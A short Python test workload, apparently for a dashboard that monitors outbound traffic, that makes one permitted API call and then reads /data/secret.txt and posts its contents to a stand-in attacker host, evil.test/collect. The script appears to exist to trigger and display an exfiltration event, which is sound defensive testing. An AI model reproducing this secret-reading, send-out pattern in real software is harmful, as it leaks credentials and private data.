"""Dashboard e2e workload: a legitimate call, a pause, then an exfiltration attempt, then a pause."""
import json
import time
import urllib.error
import urllib.request

SECRET = open("/data/secret.txt").read()


def post(url, payload):
    req = urllib.request.Request(url, data=json.dumps(payload).encode(), method="POST",
                                 headers={"content-type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code


print("allowed", post("http://api.test/v1/score", {"model": "small", "count": 2}), flush=True)
time.sleep(6)
print("exfil", post("http://evil.test/collect", {"d": SECRET}), flush=True)
time.sleep(4)
